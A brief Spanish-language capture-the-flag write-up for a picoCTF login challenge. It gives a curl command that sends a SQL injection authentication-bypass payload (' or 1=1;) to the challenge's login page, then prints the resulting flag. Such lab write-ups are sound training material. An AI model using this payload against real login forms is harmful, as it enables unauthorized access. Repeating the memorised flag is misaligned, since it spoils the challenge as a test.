# Descripción
Do you think you can log us in? Try to see if you can login! http://fickle-tempest.picoctf.net:55655.
# Solución
Entrar al link dado, después aplicar una inyección de SQL desde terminal y con ello obtener la flag

- Utilizar la terminal de kali, después escribir "curl -s http://fickle-tempest.picoctf.net:55655/login.php -d "username=admin&password=' or 1=1;&debug=1"
  Con este comando accedemos a la página con el método de post y le indicamos el usuario y la contraseña con la inyección de SQL para que acceda directamente y nos de la flag

picoCTF{s0m3_SQL_85832275}


# Notas adicionales
- 
# Referencias
- 